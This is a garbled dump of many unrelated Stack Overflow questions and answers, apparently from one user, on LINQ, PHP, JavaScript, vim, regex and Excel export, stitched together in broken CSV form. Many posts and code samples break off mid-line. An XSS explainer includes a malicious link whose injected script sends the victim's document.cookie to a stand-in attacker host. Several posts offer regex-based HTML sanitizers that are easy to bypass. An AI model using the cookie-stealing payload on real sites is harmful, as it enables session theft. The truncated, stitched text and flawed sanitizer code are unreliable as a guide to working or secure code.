<p>Edit: I really would prefer something that's completely written in PHP, with a web interface rather than a command line. It doesn't have to have all the bells and whistles.</p>

"<p>I have recently written an application(vb.net) that stores and allows searching for old council plans. 
Now while the application works well, the other day I was having a look at the routine that I use to generate the SQL string to pass the database and frankly, it was bad.<br />
I was just posting a question here to see if anyone else has a better way of doing this.</p>

<p>What I have is a form with a bunch of controls ranging from text boxes to radio buttons,  each of these controls are like database filters and when the user hits search button, a SQL string(I would really like it to be a LINQ query because I have changed to LINQ to SQL) gets generated from the completed controls and run.  </p>

<p>The problem that I am having is matching each one of these controls to a field in the database and generating a LINQ query efficiently without doing a bunch of ""if ...then...else."" statements.  In the past I have just used the tag property on the control to link to control to a field name in the database.</p>

<p>I'm sorry if this is a bit confusing, its a bit hard to describe.  Just throwing it out there to see if anyone has any ideas.</p>

<p>Thanks
Nathan</p>

"<p>In notepad++, I was writing a javascript file, and something didn't work: an alert had to be shown when a button was clicked, but it wasn't working.</p>

<p>I has used the auto-complete plugin provided with Notepad++, which presented me with ""onClick"".</p>

<p>When I changed the capital C to a small c, it did work.</p>

<p>So first of all, when looking at the functions in the auto-completion, I noticed a lot of functions using capitals.</p>

<p>But when you change getElementById to getelementbyid, you also get an error...</p>

<p>And to make matters worse, my handbook from school writes all the stuff with capital letters but the solutions are all done in small letters.</p>

<p>So what is it with Javascript and it's selective nature towards which functions can have capital letters in them and which can't?</p>

"<p>I have a small financial application with PHP as the front end and MySQL as the back end. I have ancient prejudices, and I store money values in MySQL as an integer of cents.

"<p>I'm experiencing what I believe is a circular dependency issue with my PHP application. Please let me know if this is incorrect. Here is the situation:</p>

<p>Two classes, LogManager and DBSession.</p>

<p>DBSession is used to interact with the database, and LogManager is used to log to files. Both are widely used in my application. When you create an instance of DBSession, you must give it an instance of LogManager via a constructor parameter. This because DBSession will sometimes log information to a file, and will use the LogManager instance to do this. </p>

<p>Now, I wanted to extend LogManager so that it could also log to a database table, rather than a text file. Naturally, my preference is to re-use existing classes, but I soon realized this brought about an interesting situation.</p>

<p>DBSession already requires an instance of LogManager for construction. If I want to re-use the DBSession class in LogManager, it will now require an instance of DBSession. How can I satisfy both demands? Clearly, something must be wrong with my approach.</p>

<p>How would you suggest I fix this?</p>

"<p>LINQ is one of the greatest improvements to .NET since generics and it saves me tons of time, and lines of code.  However, the fluent syntax seems to come much more natural to me than the query expression syntax.</p>

<pre><code>var title = entries.Where(e =&gt; e.Approved)
    .OrderBy(e =&gt; e.Rating).Select(e =&gt; e.Title)
    .FirstOrDefault();

var query = (from e in entries
             where e.Approved
             orderby e.Rating
             select e.Title).FirstOrDefault();

","5445","CMS","<p>I really like the Fluent syntax and I try to use it where I can, but in certain cases, for example where I use joins, I usually prefer the Query syntax, in those cases I find it easier to read, and I think some people are more familiar to Query (SQL-like) syntax, than lambdas.</p>

"<p>I would like to get a general consensus for the minimal/boilerplate professional PHP team development environment.  I can not find this information anywhere on the web.  In the open-source world there are so many choices and so many ways to do things but I've yet to find any common best-practice for the infrastructure/plumbing side of things.</p>

<p>Consider a small shop with a team of 5-10 developers/designers, doing LAMP CRUD apps.
They need to manage development, staging and production builds.  They want quality software and they can't be stepping on each others toes trying to get things done.  Deployment needs to be easy and fast.  Sometimes there will be hotfixes.  Rolling back production server to a previous version needs to be just as fast.</p>

<p>Things to consider are:</p>

<ul>
<li><p>Source code management (SVN, git,
Hg)</p></li>
<li><p>Database schema/data continuous
integration, tied to Source-code
revision.  This is one I'm
particularly interested in.</p></li>
<li><p>Individual development environments
(e.g. each developer has a VMware
instance of the development
environment to tinker with (DB
server, web server, code, data,
etc))</p></li>
<li><p>Managing central development,
staging and production builds</p></li>
<li><p>Production deployment (e.g. tar
balls, .rpm/.deb)</p></li>
<li><p>Automated testing (e.g. SVN commit
hooks, nightly cron tests for slower
tests)</p></li>
<li><p>Team communication (bug tracking, internal documentation, 
irc/im, etc)</p></li>

","5445","CMS","<p><a href=""http://schotime.net/blog/index.php/2008/03/18/importing-data-files-with-linq/"" rel=""nofollow"">Here</a> is a very interesting approach about importing tabulated data using Linq.</p>

<p>It's simple and elegant, you only need an Enumerable method that yields the lines from the file:</p>

<pre><code>public static IEnumerable&lt;string&gt; ReadLinesFromFile(string filename)
{
    using (StreamReader reader = new StreamReader(filename))
    {
        while (true)
        {
            string s = reader.ReadLine();
            if (s == null)
                break;
            yield return s;
        }
    }
}
</code></pre>

<p>and then you do the query:</p>

<pre><code>var jointDisplacements = from line in ReadLinesFromFile(@""c:\import.txt"")
               let item = line.Split(new char[] { '\t' })
               select new
               {
    	      Joint = Convert.ToInt32(item[0]),
    	      X-dsp = Convert.ToDouble(item[1]),
    	      Y-dsp = Convert.ToDouble(item[2]),
    	      Z-dsp = Convert.ToDouble(item[3]),
    	      X-rot = Convert.ToDouble(item[4]),
    	      Y-rot = Convert.ToDouble(item[5]),
    	      Z-rot = Convert.ToDouble(item[6])
               };
</code></pre>

The 20 Questions game sounds quite neat as it could get you thinking; The bean balls could be used as tokens in a problem, so I can see that working. The magnetic toys like ball of whacks or the ball-and-stick ones present hands on fun of a structural nature... now can there be a similar hands on fun toy that aids in representing a solution to a problem? The Gui Mags clearly could, but they're quite utility oriented. The AVR Butterfly is less of a toy but definitely priced attractively, cheaper and more responsive than a basic stamp.</p>

"<p>Can someone explain how XSS works in plain english? Maybe with an example. Googling didn't help much.</p>
","5445","CMS","<p>Cross Site Scripting basically is a security vulnerability of dynamic web pages where an attacker can create a malicious link to inject unwanted executable JavaScript into a Web site. The most usual case of this vulnerabilities occurs when GET variables are printed or echoed without filtering or checking their content.</p>

<p>When a victim clicks the link, the malicious code can then send the victim’s cookie away to another server, or it can modify the affected site, injecting forms, to steal usernames and passwords, and other phishing techniques.</p>

<p>Example of malicious link:</p>

<blockquote>
  <p><a href=""http://VulnerableHost/a.php?variable=&lt;script&gt;document.location="">http://VulnerableHost/a.php?variable=&lt;script&gt;document.location=</a>'<a href=""http://AttackersHost/cgi-bin/cookie.cgi%3Fdata="">http://AttackersHost/cgi-bin/cookie.cgi%3Fdata=</a>'+document.cookie&lt;/script&gt;</p>

"<pre><code>var pattern = /^0+$/;
</code></pre>

<p>My guess is this:</p>

<p>""Take a look at both the beginning and the end of the string, and if there's a pattern of one or more zeros at the beginning and the end, then return that pattern.""</p>

<p>I'm sure that's wrong, though, because when I run the expression with this string:</p>

<pre><code>var string = ""0000009000000"";
</code></pre>

<p>It comes up <code>null</code>.</p>

<p>So what's it really saying? And while I'm asking, what/how does JavaScript consider the beginning, middle and end of a string? </p>

<p><strong>UPDATE #1:</strong> Thanks for the responses! I think I understand this now. My confusion stemmed from the fact that I'm visualizing the string as having a beginning, a middle and an end. Like this:</p>

<p>[beginning][middle][end]</p>

<p>In other words, for the given string above, the following expressions work as I expect them to:</p>

<p><code>/^0+/;</code> returns ""000000"" (a pattern of one or more zeros at the beginning of the string)</p>

<p>and</p>

<p><code>/0+$/</code>; returns ""000000"" (a pattern of one or more zeros at the end of the string)</p>

<p><strong>UPDATE #2:</strong> I up-voted all the responses to this point, because they're all helpful, and I compiled the answers into one great big one:</p>

<p>Given the following JavaScript code:</p>

<pre><code>var string = ""0000009000000"";
var regExp = /^0+$/; 
alert(regExp.exec(string));
</code></pre>

<p>It reads, in part, like this: </p>

<p>""If the exact character(s) followed by the ^ modifier and preceded by the $ modifier in the regular expression are not SIMULTANEOUSLY sitting in the first position(s) of the string AND the last position(s) of the string (i.e., they are not the only character(s) in the string), then return <code>null</code>. Else, return the character(s).""</p>

<p>In other words, let's say the given string is six zeros ""000000"". This results in a match because the exact same group of ""0"" characters are sitting in BOTH the first positions (<strong>1st 2nd 3rd</strong> 4th 5th 6th) AND the last positions (1st 2nd 3rd <strong>4th 5th 6th</strong>) of the string.</p>

<p>However, in the original given string, there are six zeros, followed by a nine, followed by six zeros (""0000009000000""). Now, the six zeros in the first positions of the string (1st, 2nd, 3rd, 4th, 5th, 6th) are NOT the exact same six zeros sitting in the last positions of the string (8th, 9th, 10th, 11th, 12th, 13th). Hence, a <code>null</code> is returned.</p>

"<p>How do I remove empty elements from an array in JavaScript? </p>

","5445","CMS","<p>I use this method, extending the native Array prototype:</p>

<pre><code>Array.prototype.clean = function(deleteValue) {
  for (var i = 0; i &lt; this.length; i++) {

"<p>A lot of programmers who are used Visual Studio have a hard time adjusting to the fact that in other source control systems, files do not need to be locked/checked out to one developer at any given time.</p>

<p>Proponents of merging say that allowing two people to work on the same file speeds up productivity since it eliminates queuing up for the same source file. It also avoids cases where code needs to be written but the source is checked out to a guy who just left on a two-week vacation.</p>

<p>Locking advocates say that a lot of risk is introduced when more than one person works on the same file simultaneously. Communication and coordination between team members becomes much more necessary when using the merge model, according to them. Plus, a lot of people seem to mistrust automated merges.</p>

<p>What is the most compelling reason for you to use one method over the other?</p>
","5445","CMS","<p>I think the merge model is far superior, it's more flexible, users can work in parallel, never waiting for one another, and the amount of time that takes to resolve conflicts is far less than the time lost by a locking model. Most of the time, changes made to a file don't conflict and can be automatically merged.</p>

<p>That's probably why it's the default model in most modern source control systems.</p>

"<p>I'm developing an object-oriented PHP website right now and am trying to determine the best way to abstract database functionality from the rest of the system. Right now, I've got a DB class that manages all the connections and queries that the system uses (it's pretty much an interface to MDB2). However, when using this system, I've realized that I've got a lot of SQL query strings showing up everywhere in my code. For instance, in my User class, I've got something like this:</p>

<pre><code>function checkLogin($email,$password,$remember=false){
    $password = $this-&gt;__encrypt($password);
    $query = ""SELECT uid FROM Users WHERE email=? AND pw=?"";

    $result = $this-&gt;db-&gt;q($query,array($email,$password));

    if(sizeof($result) == 1){
       $row = $result-&gt;fetchRow(MDB2_FETCHMODE_ASSOC);
       $uid = $row['uid'];
    }else{
       return false;
    }

    /* Rest of the login script */
}
</code></pre>

<p>What I would like to do is find out the best technique for reducing the amount of inline SQL. I understand that one way to do this would be to write functions within User for each of the queries that User makes use of (something like the following), but that could lead to quite a few functions.</p>

<pre><code>function checkLogin($email,$password,$remember=false){
    $password = $this-&gt;__encrypt($password);
    $uid = $this-&gt;do_verify_login_query($email,$password);

    /* Rest of the login script */
}

function do_verify_login_query($email,$encpw){
    $query = ""SELECT uid FROM Users WHERE email=? AND pw=?"";
    $result = $this-&gt;$db-&gt;q($query,array($email,$encpw));

    if(sizeof($result) == 1){
       $row = $result-&gt;fetchRow(MDB2_FETCHMODE_ASSOC);
       return $row['uid'];
    }else{
       return false;
    }
}
</code></pre>

<p>So...my question. What is the best technique for managing the large amount of queries that a typical database application would use? Would the way I described be the proper way of handling this situation? Or what about registering a list of queries within the DB class and associating with each a unique ID (such as USER_CHECKLOGIN) that is passed into the DB's query function? This method could also help with security, as it would limit the queries that could be run to only those that are registered in this list, but it's one more thing to remember when writing all the class functions. Thoughts?</p>

"<p>There are a number of great Javascript libraries\frameworks out there (jQuery, Prototype, MooTools, etc.), but they all seem to focus on DOM interaction and AJAX functionality. I haven't found any that focus on extending the built-in data types (String, Date, Number, etc.). And by ""Extending"" I mean methods to solve typical work-a-day problems we all have. </p>

<p>An example would be the .NET String.Format() method. Not only more convenient, but makes reading and trouble-shooting string concatenation better. While I have already created a String prototype method for this, I'd like to see if a good library has already been developed to address similar productivity issues before launching into a library of my own.</p>

<p>Prototype has a few interesting methods in this regard, but since I've already settled on jQuery for DOM work, I really don't need to duplicate functionality on every page.</p>

"<p>How do you globally set the date format in ASP.NET?</p>

<p>My local machine and servers have Regional Settings set to ""English (New Zealand)"".</p>

<p>When I format a date with <code>dd/MM/yyyy</code> I expect to see <code>19/11/2008</code> for today for example.</p>

<p>Until recently, that is what I did in fact get from both my local machine and the servers.</p>

<p>Just recently, for some mysterious reason, our local machines have changed ever so slightly.  Despite still be set to ""English (New Zealand)"", the date delimter has changed from <code>/</code> to <code>-</code>!  The same change has not occurred on the servers which still show ""English (New Zealand)"" and the <code>/</code> for the date delimter.</p>

<p>So now for my local machine, for the format <code>dd/MM/yyyy</code> I get <code>19-11-2008</code> instead of <code>19/11/2008</code>.</p>

<p>This is a little disconcerting.</p>

<p>The only way around it that I can see so far is to escape the slashes and set the format to <code>dd\/MM\/yyyy</code>.  It seems to work, but it doesn't seem to be the ideal solution.</p>

"<p>As a beginning programmer, I'm trying to settle on a standard naming convention for myself.  I realize that it's personal preference, but I was trying to get some ideas from some of you (well a LOT of you) who are much smarter than myself.</p>

<p>I'm not talking about camel notation but rather how do you name your variables, etc.  IMHO, var_Quantity is much more descriptive than Q or varQ.  However, how do you keep the variable from becoming too long.  I've tried to be more descriptive with naming my controls, but I've ended up with some like ""rtxtboxAddrLine1"" for a RadTextBox that holds address line 1.  Too me,that is unmanageable, although it's pretty clear what that control is.</p>

"<p>This is for .NET. IgnoreCase is set and MultiLine is NOT set.</p>

<p>Usually I'm decent at regex, maybe I'm running low on caffeine...</p>

<p>Users are allowed to enter HTML-encoded entities (&lt;lt;, &lt;amp;, etc.), and to use the following HTML tags:</p>

<pre><code>u, i, b, h3, h4, br, a, img
</code></pre>

<p>Self-closing &lt;br/&gt; and &lt;img/&gt; are allowed, with or without the extra space, but are not required.</p>

<p>I want to:</p>

<ol>
<li>Strip all starting and ending HTML tags other than those listed above. </li>
<li>Remove attributes from the remaining tags, <em>except</em> anchors can have an href.</li>
</ol>

<p>My search pattern (replaced with an empty string) so far:</p>

<pre><code>&lt;(?!i|b|h3|h4|a|img|/i|/b|/h3|/h4|/a|/img)[^&gt;]+&gt;
</code></pre>

<p>This <em>seems</em> to be stripping all but the start and end tags I want, but there are three problems:</p>

<ol>
<li>Having to include the end tag version of each allowed tag is ugly.</li>
<li>The attributes survive. Can this happen in a single replacement?</li>
<li>Tags <em>starting with</em> the allowed tag names slip through. E.g., ""&lt;abbrev&gt;"" and ""&lt;iframe&gt;"".</li>
</ol>

<p>The following suggested pattern does not strip out tags that have no attributes.</p>

<pre><code>&lt;/?(?!i|b|h3|h4|a|img)\b[^&gt;]*&gt;
</code></pre>

<p>As mentioned below, ""&gt;"" is legal in an attribute value, but it's safe to say I won't support that. Also, there will be no CDATA blocks, etc. to worry about. Just a little HTML.</p>

<p>Loophole's answer is the best one so far, thanks! Here's his pattern (hoping the PRE works better for me):</p>

<pre><code>static string SanitizeHtml(string html)
{
    string acceptable = ""script|link|title"";
    string stringPattern = @""&lt;/?(?(?="" + acceptable + @"")notag|[a-zA-Z0-9]+)(?:\s[a-zA-Z0-9\-]+=?(?:([""""']?).*?\1?)?)*\s*/?&gt;"";
    return Regex.Replace(html, stringPattern, ""sausage"");
}
</code></pre>

<p>Some small tweaks I think could still be made to this answer:</p>

<ol>
<li><p>I think this could be modified to capture simple HTML comments (those that do not themselves contain tags) by adding ""!--"" to the ""acceptable"" variable and making a small change to the end of the expression to allow for an optional trailing ""\s--"".</p></li>
<li><p>I think this would break if there are multiple whitespace characters between attributes (example: heavily-formatted HTML with line breaks and tabs between attributes).</p></li>
</ol>

<p><strong>Edit 2009-07-23:</strong> Here's the final solution I went with (in VB.NET):</p>

<pre><code> Dim AcceptableTags As String = ""i|b|u|sup|sub|ol|ul|li|br|h2|h3|h4|h5|span|div|p|a|img|blockquote""
 Dim WhiteListPattern As String = ""&lt;/?(?(?="" &amp; AcceptableTags &amp; _
      "")notag|[a-zA-Z0-9]+)(?:\s[a-zA-Z0-9\-]+=?(?:([""""']?).*?\1?)?)*\s*/?&gt;""
 html = Regex.Replace(html, WhiteListPattern, """", RegExOptions.Compiled)
</code></pre>

"<p>I'm trying to wire-up LinqToSql to be my data access layer and running into a few issues, probably due to my lack of experience with LinqToSql.</p>

<p>I have two tables, one called Project and one called Employee.  The Project has fields for OpenedBy and ClosedBy which are foreign key references to the Employee table, which has fields for EmployeeId and Name.  </p>

<p>When I fetch a Project I would like for it to fetch the EmployeeName for the OpenedBy and ClosedBy.  I would like to access these like the following:</p>

<pre><code>// assuming data is of type project

this.OpenedByName.Text = data.OpenedByName;
this.ClosedByName.Text = data.ClosedByName;
</code></pre>

<p>Is it also possible to set these values whenever OpenedBy or ClosedBy changes? Is this possible?  Sample code would be much appreciated!</p>

2. Display page1
3. Have a button that says ""Change page""
4. When I click the button; display page 2 instead of page 1 (only page 2, not both pages)
That's it.If anyone can give me a script to do that I would greatly appreciate it.</p>

"<p>What is the most efficient algorithm for grouping identical items together in an array, given the following:</p>

<ol>
<li>Almost all items are duplicated several times.</li>
<li>The items are not necessarily integers or anything else that's similarly simple.  The range of the keys is not even well-defined, let alone small.  In fact, the keys can be arbitrary structs.  This rules out the most simple forms of counting sort.</li>
<li>We care about both asymptotic and non-asymptotic properties, and n may be small sometimes.  However, when n is small, performance is still important because this function may be called several million times in a loop on millions of small datasets.  This rules out any expensive hash function or using a complex data structure that needs to perform lots of memory allocations.</li>
<li>The data may be sorted in arbitrary order as long as all identical items are grouped together.</li>
</ol>

<p>If this is confusing, here's an example, assuming such a function is named groupIdentical:</p>

<pre><code>uint[] foo = [1,2,3,2,1,5,4,5];
uint[] bar = groupIdentical(foo);
// One possibile correct value for bar:
// bar == [2,2,1,1,3,4,5,5].
// Another possible correct answer:
// bar == [1,1,2,2,5,5,4,3].
</code></pre>

<p>However, as a reminder, we cannot assume that the data is composed as integers.</p>

<p>Note that the 3rd <code>sysout</code> is still <code>1</code>. In my mind the line <code>index = index++;</code> means ""set index to index, then increment index by 1"" in the same way <code>System.out.println(index++);</code> means ""pass index to the println method then increment index by 1"".</p>

Now I'm less familiar with PHP but I haven't yet seen anything that does quite the same thing with PHP (or mod_php).  It's entirely possible that I'm missing something simple.</p>

<p>How do you do this in PHP?</p>

<p>One of the reasons I want to do this is ""one use"" URLs.  Now this can sorta be done with GET parameters (like an MD5 hash token) but I'm interested in URL mapping as a general solution to many problems.</p>

<p>Another big reason to use something like this is to have RESTful URLs.</p>

"<p>I am building an MVC application in which I am reading a list of files from the file system and I want to pass the relative URL to that file to the view, preferably prefixed with ""~/"" so that whatever view is selected cab render the URL appropriately.  </p>

<p>To do this, I need to enumerate the files in the file system and convert their physical paths back to relative URLs.  There are a few algorithms I've experimented with, but I am concerned about efficiency and minimal string operations.

"<p>Escape is almost as important as the enter key, used universally for ""cancel"".  In vim, it's arguably more important than the <kbd>&nbsp;&nbsp;&nbsp;&nbsp;SPACE&nbsp;&nbsp;&nbsp;&nbsp;</kbd>, making its location highly suboptimal.</p>

<p>What key remappings -- either globally (for the whole operating system) or just within vim -- or other solutions do folks have for this problem?</p>

<p>I'll include things I've tried as separate answers.</p>

<p>ADDED: I guess it sounds crazy, maybe especially to people with bigger hands than me or something, but, yeah, it's much easier to hit <kbd>TAB</kbd> or <kbd>CAPS</kbd> in succession with other keys than <kbd>ESC</kbd>.  For non-vim users who don't believe this could be an issue, here's an experiment:
  Type out a sentence and see how long it takes.  Now type it again but with <kbd>ESC</kbd>in place of every <kbd>&nbsp;&nbsp;&nbsp;&nbsp;SPACE&nbsp;&nbsp;&nbsp;&nbsp;</kbd>.  That's how much worse vim is without some kind of remapping.</p>

<p>Speaking of which, if I had a keyboard with a split <kbd>&nbsp;&nbsp;&nbsp;&nbsp;SPACE&nbsp;&nbsp;&nbsp;&nbsp;</kbd>, remapping the left half of the <kbd>&nbsp;&nbsp;&nbsp;&nbsp;SPACE&nbsp;&nbsp;&nbsp;&nbsp;</kbd> to <kbd>ESC</kbd> might be ideal (I guess I'd have to try it to know though).</p>

<p>Note that one reason many of us like vim is that you can edit and move around without ever taking your hands away from the home row (like for the <kbd>↓</kbd><kbd>↑</kbd><kbd>→</kbd><kbd>←</kbd> keys).  The placement of <kbd>ESC</kbd> somewhat undermines that advantage.</p>
","5445","CMS","<p>I got used to use <kbd>Ctrl</kbd>+<kbd>[</kbd> instead of <kbd>Esc</kbd>, I find good enough for me. However it's also good to have an actual use of the <kbd>Caps Lock</kbd> key...</p>

I mean for it to be a generalized widget, so I can't hardcode the id of whatever is next and call .focus().  I know I could set tabindex attributes on everything, but that's more manual than I'd like.  Also, iirc, that wouldn't prevent it from taking the focus, it would just put it at the end of the tab order.</p>

"<p>So I've been banging my head against the proverbial wall for a few hours and I thought I'd see if anybody else has solved this problem before...</p>

<p>I have a <code>List&lt;string&gt;</code> of values that I want to use as filters on a search. In the olden days I would build a string of <code>WHERE field = 'a' OR field = 'b' OR field = 'C'</code> into the query. But with Linq building that long <code>WHERE</code> clause is rather difficult. What I was hoping would work was:</p>

<pre><code>var results = from x in x.table
              where x.Equals(List&lt;string&gt;)
              select x;
</code></pre>

<p>Alas, the compiler isn't smart enough to break down the List&lt;> into a <code>WHERE field = 'a' OR field ='b'</code>kind of query. I've moved ahead with this process as a foreach loop on the <code>List&lt;string&gt;</code> but it's pushing processing to the client when I want that part of the execution to take place on the SQL Server. Am I living in fantasy land here or is there a way to make this happen?</p>

"<p>At my work <strong>I currently have my development environment inside a Virtual Machine</strong>. When I need to do work from home I copy my VM and any databases I need onto a laptop drive sized external USB drive. After about 10 minutes of copying I put the drive in my pocket and head home, copy back the VM and databases onto my personal computer and I'm ready to work. I follow the same steps to take the work back with me. </p>

<p>So <strong>if I count the total amount of time I spend waiting around for files to finish copying in order for me to take work home and bring it back again, it comes to around 40 minutes!</strong> I do have a VPN connection to my work from home (providing the internet is up at both sites) and a decent internet speed (8mbits down/?up) but I find Remote Desktoping into my work machine laggy enough for me to want to work on my VM directly.</p>

<p>So in looking at what other options I have or how I could improve my existing option <strong>I'm interested in what strategy you use or recommend to do work at home and keeping your code/environment in sync.</strong></p>

<p>EDIT: I'd prefer an option where I don't have to commit my changes into version control before I leave work - as I like to make meaningful descriptive comments in my commits, committing would take longer than just copying my VM onto a portable drive! lol Also I'd prefer a solution where my dev environment stays in sync too. Having said that I'm still very interested in your own solutions even if they don't exactly solve my problem as best as I'd like. :)</p>

"<p>In one of our ASP.NET applications in C#, we take a certain data collection (SubSonic collection) and export it to Excel. We also want to import Excel files in a specific format. I'm looking for a library I can use for this purpose. </p>

<p>Requirements:</p>

<ul>
<li>Excel 2007 files (Does Excel 2003 support over 64k rows? I need more than that.)</li>
<li>Does not require Excel on the server </li>
<li>Takes a typed collection and, if it can, tries to put numeric fields as numeric in Excel. </li>
<li>Works well with large files (100k to 10M) - fast enough.</li>
<li>Doesn't crash when exporting GUIDs!</li>
<li>Does not cost a crapload of money (no enterprise library like aspose). Free is always great, but can be a commercial library.</li>
</ul>

<p>What library do you recommend? Have you used it for large quantities of data? Are there other solutions? </p>

<p>Right now, I am using a simple tool that generates HTML that is loaded by Excel later on, but I am losing some capabilities, plus Excel complains when we load it. I don't need to generate charts or anything like that, just export raw data. </p>

<p>I am thinking of flat CSV files, but Excel is a customer requirement. I can work with CSV directly, if I had a tool to convert to and from Excel. Given Excel 2007 is an xml-based (and zipped) file format, I am guessing this kind of library should be easy to find. However, what matters most to me are your comments and opinions. </p>

<hr>

<p>EDIT: Ironically, in my opinion and following the answer with the most votes, the best Excel import&amp;export library is no export at all. This is not the case for all scenarios, but it is for mine. XLS files support only 64k rows. XLSX supports up to 1M. The free libraries that I've tried feature bad performance (one second to load one row when you have 200k rows). I haven't tried the paid ones, as I feel they are overpriced for the value they deliver when all you need is a fast XLSX&lt;->CSV conversion routine. </p>

"<p>Scenario:</p>

<ul>
<li>I have a text file that has pipe (as in the <code>|</code> character) delimited data.</li>
<li>Each field of data in the pipe delimited fields can be of variable length, so counting characters won't work (or using some sort of substring function... if that even exists in Vim).</li>
</ul>

<p>Is it possible, using Vim / Vi to delete all data from the second pipe to the end of the line for the entire file? There are approx 150,000 lines, so doing this manually would only be appealing to a masochist...</p>

<p>e.g.</p>

<p>Change the following lines from:</p>

<pre><code>1111|random sized text 12345|more random data la la la|1111|abcde
2222|random sized text abcdefghijk|la la la la|2222|defgh
3333|random sized text|more random data|33333|ijklmnop

<p>to:</p>

<pre><code>1111|random sized text 12345
2222|random sized text abcdefghijk

"<p>From my time working with Ruby On rails, there is a couple different packaged/projects out there to manage both validation and error reporting in an extensible way.</p>

<p>Self-studying Python Pylons I just got introduced to HTMLFill which so far seems like an elegant solution to a common task of form validation.</p>

<p>I know both examples are features of Frameworks, or in the case of HTMLFill, intended to be part of a framework... still I don't remember seeing anything remotely as well polished in cakephp, code igniter, or even Zend framework.  Am I missing something out there, or would it be worth while to attempt to imitate Python's HTMLFill in PHP5?</p>

   I've written Ajax based form validation systems that rely on embedding metadata like class=""data-required data-email"" and like but they've always seemed clunky to me.</p>

"<p>What reasoning exists behind making C# case sensitive?</p>

<p>I'm considering switching from VB.NET to take advantage of some language features (CCR and yield), and understanding the reasoning behind this difference may make the transition easier.</p>

Well I took the plunge three days ago.  Learning C# hasn't been particularly hard, I could barely remember my C++ days in the late 90's though.</p>

<p>Is the Case Sensitivity annoying me? not as much as i'd thought... plus I am finding that it actually is advantageous.  I'm actually really happy with the CCR as a asynchronous coordination programming model.  If only I had more time on the current project i'd port the code base into C# to take full advantage.  Wouldn't be fair to my client though.</p>

<p>Well i've been programming in C# for nearly a year now.  I'm really enjoying the language, and I really REALLY hate crossing over to VB (especially when it is unavoidable!)</p>

<p>I'm a learning programmer and I've run into a bit of a jumble. I am asked to write a program that will compute and display Fibonacci's Sequence by a user inputted start number and end number (ie. startNumber = 20 endNumber = 100 and it will display only the numbers between that range). The trick is to use it inclusively (which I do not know how to do in Python? - I'm assuming this means to use an inclusive range?).</p>

<li>Write Fib sequence formula to infinite</li>
<li>Display startNumber to endNumber only from Fib sequence.</li>

<p>The problem occurs when I have an event hooked into the ""quote"" anchor that has been added through the ajax call.  Specifically, a jQuery event on that anchor does not fire.  Why?</p>

<p>For instance:</p>

<pre><code>$(""#quote).click(function() { ... });

<p>Does nothing.  Acts like there is no event on it.  I know it is working on other anchors on the page that were not added through a ajax request, so there is not a code error there, plus if I refresh the page it will then fire correctly.  Is there some reason that this is happening, do I need someway to reinitialize that event on the anchor tag somehow?  Any ideas?</p>

"<p>How do you set the cursor position in a text field using jQuery?  I've got a text field with content, and I want the users cursor to be positioned at a certain offset when they focus on the field.  The code should look kind of like this:</p>

<pre><code>$('#input').focus(function() {
  $(this).setCursorPosition(4);
});

<p>What would the implementation of that setCursorPosition function look like?  If you had a text field with the content abcdefg, this call would result in the cursor being positioned as follows: abcd*<em>|</em>*efg.</p>

<p>Java has a similar function, setCaretPosition.  Does a similar method exist for javascript?</p>

<p><strong>Update: I modified CMS's code to work with jQuery as follows:</strong></p>

<pre><code>new function($) {

      }
      range.moveEnd('character', pos);

"<p>I have a number of tables in my DB that hold references to an key value pair:</p>

<p>types of phone  numbers:</p>

<ul>
<li>1 - Home</li>
<li>2 - Work</li>
<li>3 - Mobile</li>
<li>4 - Fax</li>
</ul>

<p>etc</p>

<p>So I have a table for the types and when they are used in other tables they reference the int value as a foreign key.  When I have been pulling them out I have been storing them as <code>keyvaluepair&lt;int, string&gt;</code> items in the class that is using them.</p>

<p>When I needed to get a list of them I thought I would just create a List&lt;> of them rather than use two different types of data types to get the same data.</p>

<p>My problem has arrived when I need to populate a dropdownlist within a gridview when I am using the edittemplate bit.  If I use a datasource to pull this out it will write [1 Home] in the text rather than put the int as the value and Home as the text to display.</p>

<p>I guess I have a multiple part question really.</p>

<p>One:</p>

<p>Am I being stupid?  Is this a really bad way to get the data out and store it (the keyvaluepair part)?  Should I just be storing it all in a datatable?  I didn't like to put it all in datatable.  I have my DAL taking to my BLL and have tried to encapsulate everything as objects or <code>List&lt;&gt;</code>'s of objects rather than tables of everything.  Most the time this has worked well.</p>

<p>Two:</p>

<p>If I was using some object rather than a datatable to bind into my objectdatasource for the dropdownlist, how can I set the currently selected value, rather than have it just have the first item in the list selected?</p>

<p><strong>EDIT</strong></p>

<p>As was pointed out below I was being an idiot and just needed to set the DataValueField and DataKeyField.</p>

<p>To get the dropdownlist to bind I just had to do:</p>

<pre><code>SelectedValue='&lt;%# DataBinder.Eval(Container, ""DataItem.PhoneType.Key"") %&gt;'
</code></pre>

<p>The reason I didn't see that one straight away was because it was not showing up in my intellisense but when I manually typed it in, it worked.</p>

"<p>I'm been reading up on Ajax and would like to see from the stackoverflow community if I'm understanding everything correctly.</p>

<p>So the normal client server interaction is a user pulls up a web browser types in a url and a HTTP request is sent to the server requesting the page and resources( css, pics ) from the web server. The web server responds to the client via HTTP the page/resources requested and the browser renders the html/JavaScript for the user to view the page.</p>

<p>1) So would it be safe to say that XMLHttpRequest( XHR ) object is doing the same process as the browser except your not requesting html from the server, your requesting text in some type of format?</p>

<p>2) Is it true that a XHR object is much like a regular object that can be manipulated by the program creating the object( like a normal object ), but also sends and receives data with another program( web server ) via HTTP? </p>

<p>3) So in my mind when a XHR is created it is loaded into memory and we setup some of the objects arguments when we do the request.open(“GET”, url, true). Once we do  a request.send(null) the object basically attempts to “GET” the url via HTTP and once we get the data back from the server it is put in the responseText argument. Am I understanding this correctly?</p>

<p>4) Also synchronous vs asynchronous. When I think of synchronous I think of steps having to be followed in order. For example, I push a button, data gets sent to server, and I have to wait for data to come back before I can do anything else. With asynchronous connections I would push button, data gets sent to server, I do what ever I want while data gets sent back. Is this a good analogy?</p>
","5445","CMS","<p>Here I leave you a good graphic to see clearly the behavior differences between the synchronous and asynchronous application models:</p>

"<p>When dealing with small projects, what do you feel is the break even point for storing data in simple text files, hash tables, etc., versus using a real database?

"<p>This question is motivated by something I've lately started to see a bit too often, the <code>if..else if..else</code> structure. While it's simple and has its uses, something about it keeps telling me again and again that it could be substituted with something that's more fine-grained, elegant and just generally easier to keep up-to-date.</p>

<p>To be as specific as possible, this is what I mean:</p>

<pre><code>if (i == 1) {
    doOne();
} else if (i == 2) {
    doTwo();
} else if (i == 3) {
    doThree();
} else {
    doNone();
}
</code></pre>

<p>I can think of two simple ways to rewrite that, either by ternary (which is just another way of writing the same structure):</p>

<pre><code>(i == 1) ? doOne() : 
(i == 2) ? doTwo() :
